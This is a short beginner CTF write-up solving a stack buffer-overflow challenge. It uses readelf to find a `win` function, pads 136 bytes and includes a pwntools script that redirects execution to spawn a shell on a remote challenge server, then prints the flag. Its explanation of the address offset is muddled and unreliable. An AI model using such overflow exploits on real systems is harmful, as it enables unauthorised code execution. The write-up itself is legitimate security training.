![](Pasted%20image%2020230318042000.png)
*Beginner level*

1.  Execute `readelf -s ./challenge` this will show you the pointer address of the executable
![](Pasted%20image%2020230318042859.png)
2. The `win` function address is `4011b6` add to that ascii value of the size of the `win` function which is `35` so the ptr will become `4011bb`
3. Now, from the source code you know the buffer is accepting `128` bytes, and from executing `file ./challenge` we know it's a 64-bit LSB file
4. ![](Pasted%20image%2020230318044809.png)
5. So to do the buffer overflow we need the following equation `buffer-size + base ptr size + destitnation ptr` == `128 + 8 (64-bit) + 4011bb` this way we will get buffer overflow
6. For that we write a simple python code
7. ![](Pasted%20image%2020230318045043.png)
8. 
```py
from pwn import *

conn = remote('cat.wolvctf.io', 1337)
conn.recvline()
conn.sendline(b'A' * 128 + b'B' * 8 + p64(0x4011bb))
conn.interactive() # important to actually get the shell
```
9. Notice we're using `pwn.p64(0x4011bb)` this is important to convert the hex value to the `endian` representation so it can mean something to the program stack
10. From that we get the shell!
11. ![](Pasted%20image%2020230318045404.png)
12. **FLAG:** `wctf{d0n+_r0ll_y0ur_0wn_c_:3}`